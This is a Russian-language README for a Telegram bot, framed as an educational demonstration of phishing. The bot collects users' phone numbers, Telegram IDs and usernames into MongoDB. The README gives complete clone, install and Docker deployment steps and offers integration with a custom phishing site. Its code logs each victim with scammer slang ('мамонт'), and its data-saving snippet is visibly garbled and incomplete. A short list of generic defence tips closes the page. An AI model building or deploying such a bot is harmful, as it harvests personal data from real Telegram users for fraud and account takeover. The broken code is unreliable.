## 📋 Описание проекта

Telegram бот, демонстрирующий принципы работы фишинговых атак в образовательных целях. Бот собирает номер телефона пользователя и сохраняет данные в MongoDB. Проект показывает, как злоумышленники могут использовать легитимные инструменты (Telegram API) для сбора данных.

## 🚀 Функциональность

- ✅ Сохранение данных в MongoDB:
  - Номер телефона
  - Telegram ID пользователя
  - Username (если есть)
  - Timestamp
- ✅ Возможность интеграции кастомного фишингового сайта

## 🛠 Технологии

- Python 3.12+
- или aiogram
- MongoDB через pymongo
- Docker 

## 📦 Установка и запуск

### Локальный запуск

1. Клонируйте репозиторий:
```bash
git clone https://github.com/SH1ROdev/Ribka-tgbot
cd Ribka-tgbot
```

2. Установите зависимости:
```bash
pip install -r requirements.txt
```

3. Настройте переменные окружения:
```bash
cp .env.example .env
# Замените вашу информацию в .env файл
```

4. Запустите бота:
```bash
python main.py
```

### Запуск через Docker

```bash
docker build -t Ribka .
docker run -d --env-file .env Ribka
```

## 🎯 Как это работает (для обучения)

### 1. Запрос номера телефона
```python
@router.callback_query(F.data == 'autorization')
async def telegram_auth(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer('Введите номер телефона: ')
    await state.set_state(AuthState.waiting_for_phone)
    await callback.answer()
```

### 2. Сохранение в MongoDB
При получении контакта данные сохраняются:
```python
    def push_tg_dannie(user_id, phone_number):
        cluster = MongoClient("mongodb://localhost:27017/")
        db = cluster["telegram_accs"]
        collections = db["accaunts"]

            'Telegram_id': user_id,

        }

        print(f"Мамонт ввел номер телефона!")
```

## 🛡 Защита от подобных атак

В образовательных целях важно знать, как защититься:

1. **Никогда не передавайте номер телефона незнакомым ботам**
2. **Проверяйте права бота** перед взаимодействием
3. **Используйте двухфакторную аутентификацию**
4. **Будьте осторожны** с подозрительными ссылками
5. **Сообщайте о фишинговых ботах** в поддержку Telegram
